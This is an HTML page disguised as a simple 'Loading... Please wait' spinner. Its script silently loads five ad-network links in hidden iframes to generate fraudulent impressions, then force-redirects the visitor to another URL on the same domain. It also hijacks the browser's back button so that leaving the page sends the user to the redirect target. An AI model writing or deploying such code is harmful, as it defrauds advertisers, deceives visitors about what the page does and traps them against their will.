<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #f0f0f0;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }
    .spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #0088cc;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 18px;
      color: #444;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <p>Loading... Please wait</p>

  <script>
    const adLinks = [
      "https://defenceflamboyant.com/yd12zx82?key=67522af1939259a651acf6e76ab956a5",
      "https://defenceflamboyant.com/zjhczq0ijd?key=619657cf2002c7c744a1bf2f6463bf18",
      "https://defenceflamboyant.com/b3n65nuq?key=5e7481b6ce1bfb4cc354856a8bc25d07",
      "https://defenceflamboyant.com/eis4kcrj?key=5e956815c7a56517ab56830995f3f93e",
      "https://defenceflamboyant.com/ghwkr0na4?key=89592f0215baf5f43591f0d38ae29ff3"
    ];

    const redirectURL = "https://defenceflamboyant.com/z6jqn63s?key=50a1cb7c73b343b087343527296632be";
    let index = 0;

    function fireImpression(link) {
      const iframe = document.createElement("iframe");
      iframe.src = link;
      iframe.style.display = "none";
      document.body.appendChild(iframe);
    }

    function loadAds() {
      if (index < adLinks.length) {
        fireImpression(adLinks[index]);
        index++;
        setTimeout(loadAds, 300);
      } else {
        setTimeout(() => {
          window.location.href = redirectURL;
        }, 1000);
      }
    }

    // Block back button redirect
    history.pushState(null, "", location.href);
    window.addEventListener("popstate", function () {
      location.href = redirectURL;
    });

    window.onload = loadAds;
  </script>
</body>
</html>
